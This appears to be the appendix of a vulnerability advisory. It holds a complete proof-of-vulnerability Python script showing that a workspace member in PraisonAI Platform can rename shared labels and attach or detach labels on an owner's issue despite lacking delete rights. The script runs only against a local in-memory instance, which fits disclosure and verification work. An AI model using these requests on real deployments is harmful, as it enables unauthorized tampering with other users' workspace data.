  ## Appendix A - Full PoV Script

  Save this as `pov_platform_label_authorization_bypass.py` before running the PoC commands above.

  ```python
  #!/usr/bin/env python3
  """PoV for PraisonAI Platform label authorization gaps."""

  from __future__ import annotations

  import argparse
  import asyncio
  import json
  import os
  import subprocess
  import sys
  from pathlib import Path
  from typing import Any


  def _load_local_source(repo: Path | None) -> None:
      if repo is None:
          return
      platform_root = repo / "src" / "praisonai-platform"
      agents_root = repo / "src" / "praisonai-agents"
      for path in (str(platform_root), str(agents_root)):
          if path not in sys.path:
              sys.path.insert(0, path)


  async def _register(client: Any, email: str, name: str) -> tuple[str, str]:
      response = await client.post(
          "/api/v1/auth/register",
          json={"email": email, "password": "Password1!", "name": name},
      )
      if response.status_code >= 400:
          raise RuntimeError(f"register failed for {email}: {response.status_code} {response.text}")
      body = response.json()
      return body["token"], body["user"]["id"]


  async def _create_issue(
      client: Any,
      workspace_id: str,
      headers: dict[str, str],
      title: str,
  ) -> str:
      response = await client.post(
          f"/api/v1/workspaces/{workspace_id}/issues/",
          json={"title": title, "priority": "high"},
          headers=headers,
      )
      response.raise_for_status()
      return response.json()["id"]


  async def _issue_label_names(
      client: Any,
      workspace_id: str,
      issue_id: str,
      headers: dict[str, str],
  ) -> list[str]:
      response = await client.get(
          f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}/labels",
          headers=headers,
      )
      response.raise_for_status()
      return [label["name"] for label in response.json()]


  async def _run(repo: Path | None) -> dict[str, Any]:
      os.environ["PLATFORM_JWT_SECRET"] = "local-poc-secret-32-bytes-minimum"
      _load_local_source(repo)

      from httpx import ASGITransport, AsyncClient
      from sqlalchemy.ext.asyncio import create_async_engine

      from praisonai_platform.api.app import create_app
      from praisonai_platform.db import base as base_mod
      from praisonai_platform.db.base import Base, reset_engine

      await reset_engine()
      engine = create_async_engine(
          "sqlite+aiosqlite:///:memory:",
          echo=False,
          connect_args={"check_same_thread": False},
      )
      base_mod._engine = engine
      base_mod._session_factory = None
      async with engine.begin() as conn:
          await conn.run_sync(Base.metadata.create_all)

      app = create_app()
      transport = ASGITransport(app=app)
      async with AsyncClient(transport=transport, base_url="http://local-poc") as client:
          owner_token, _owner_id = await _register(client, "owner@example.com", "Owner")
          member_token, member_id = await _register(client, "member@example.com", "Member")
          outsider_token, _outsider_id = await _register(
              client, "outsider@example.com", "Outsider"
          )

          owner_headers = {"Authorization": f"Bearer {owner_token}"}
          member_headers = {"Authorization": f"Bearer {member_token}"}
          outsider_headers = {"Authorization": f"Bearer {outsider_token}"}

          ws_resp = await client.post(
              "/api/v1/workspaces/",
              json={"name": "Shared Workspace", "slug": "shared-workspace"},
              headers=owner_headers,
          )
          ws_resp.raise_for_status()
          workspace_id = ws_resp.json()["id"]

          add_member = await client.post(
              f"/api/v1/workspaces/{workspace_id}/members",
              json={"user_id": member_id, "role": "member"},
              headers=owner_headers,
          )
          add_member.raise_for_status()

          owner_issue_id = await _create_issue(
              client, workspace_id, owner_headers, "Owner issue"
          )

          label_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/labels",
              json={"name": "Owner triage", "color": "#ff0000"},
              headers=owner_headers,
          )
          label_resp.raise_for_status()
          label_id = label_resp.json()["id"]

          owner_delete_control_label_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/labels",
              json={"name": "Owner delete control", "color": "#00ff00"},
              headers=owner_headers,
          )
          owner_delete_control_label_resp.raise_for_status()
          owner_delete_control_label_id = owner_delete_control_label_resp.json()["id"]

          member_delete_control_label_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/labels",
              json={"name": "Member delete control", "color": "#0000ff"},
              headers=owner_headers,
          )
          member_delete_control_label_resp.raise_for_status()
          member_delete_control_label_id = member_delete_control_label_resp.json()["id"]

          owner_attach = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/labels/{label_id}",
              headers=owner_headers,
          )
          owner_attach.raise_for_status()
          initial_issue_labels = await _issue_label_names(
              client, workspace_id, owner_issue_id, owner_headers
          )

          member_delete_label = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/labels/{member_delete_control_label_id}",
              headers=member_headers,
          )

          member_patch_label = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/labels/{label_id}",
              json={"name": "Member-controlled triage", "color": "#000000"},
              headers=member_headers,
          )
          owner_label_list_after_patch = await client.get(
              f"/api/v1/workspaces/{workspace_id}/labels",
              headers=owner_headers,
          )

          member_remove_from_owner_issue = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/labels/{label_id}",
              headers=member_headers,
          )
          labels_after_member_remove = await _issue_label_names(
              client, workspace_id, owner_issue_id, owner_headers
          )

          member_add_back_to_owner_issue = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/labels/{label_id}",
              headers=member_headers,
          )
          labels_after_member_add = await _issue_label_names(
              client, workspace_id, owner_issue_id, owner_headers
          )

          outsider_patch_label = await client.patch(
              f"/api/v1/workspaces/{workspace_id}/labels/{label_id}",
              json={"name": "Outsider attempt"},
              headers=outsider_headers,
          )
          outsider_add_to_issue = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/labels/{label_id}",
              headers=outsider_headers,
          )

          owner_delete_label = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/labels/{owner_delete_control_label_id}",
              headers=owner_headers,
          )

      await engine.dispose()
      base_mod._engine = None
      base_mod._session_factory = None

      owner_labels = (
          owner_label_list_after_patch.json()
          if owner_label_list_after_patch.status_code == 200
          else []
      )
      owner_observed_label = owner_labels[0] if owner_labels else {}
      checks = {
          "initial_owner_issue_labels": initial_issue_labels,
          "member_direct_label_delete": member_delete_label.status_code,
          "member_patch_label": member_patch_label.status_code,
          "owner_observed_label_name_after_member_patch": owner_observed_label.get("name"),
          "owner_observed_label_color_after_member_patch": owner_observed_label.get("color"),
          "member_remove_label_from_owner_issue": member_remove_from_owner_issue.status_code,
          "owner_issue_labels_after_member_remove": labels_after_member_remove,
          "member_add_label_to_owner_issue": member_add_back_to_owner_issue.status_code,
          "owner_issue_labels_after_member_add": labels_after_member_add,
          "non_member_patch_label": outsider_patch_label.status_code,
          "non_member_add_label_to_issue": outsider_add_to_issue.status_code,
          "owner_delete_label": owner_delete_label.status_code,
      }
      vulnerable = (
          checks["initial_owner_issue_labels"] == ["Owner triage"]
          and checks["member_direct_label_delete"] == 403
          and checks["member_patch_label"] == 200
          and checks["owner_observed_label_name_after_member_patch"]
          == "Member-controlled triage"
          and checks["owner_observed_label_color_after_member_patch"] == "#000000"
          and checks["member_remove_label_from_owner_issue"] == 204
          and checks["owner_issue_labels_after_member_remove"] == []
          and checks["member_add_label_to_owner_issue"] == 204
          and checks["owner_issue_labels_after_member_add"] == ["Member-controlled triage"]
          and checks["non_member_patch_label"] == 403
          and checks["non_member_add_label_to_issue"] == 403
          and checks["owner_delete_label"] == 204
      )
      return {
          "package": "praisonai-platform",
          "source": _source_id(repo),
          "workspace_role": "member",
          "summary": (
              "A workspace member can rewrite shared label taxonomy and add/remove labels "
              "on an owner-created issue even though direct label deletion is owner/admin-only."
          ),
          "issue_id": owner_issue_id,
          "label_id": label_id,
          "checks": checks,
          "vulnerable": vulnerable,
      }


  def _source_id(repo: Path | None) -> str:
      if repo is None:
          import importlib.metadata

          return f"pypi:praisonai-platform=={importlib.metadata.version('praisonai-platform')}"
      rev = subprocess.check_output(
          ["git", "-C", str(repo), "rev-parse", "HEAD"],
          text=True,
      ).strip()
      return f"git:{rev}"


  def main() -> int:
      parser = argparse.ArgumentParser()
      parser.add_argument("--repo", type=Path)
      parser.add_argument("--json", action="store_true")
      args = parser.parse_args()

      result = asyncio.run(_run(args.repo.resolve() if args.repo else None))
      if args.json:
          print(json.dumps(result, indent=2, sort_keys=True))
      else:
          for key, value in result["checks"].items():
              print(f"{key}: {value}")
          print(f"vulnerable: {result['vulnerable']}")
      return 0 if result["vulnerable"] else 1


  if __name__ == "__main__":
      raise SystemExit(main())
  ```
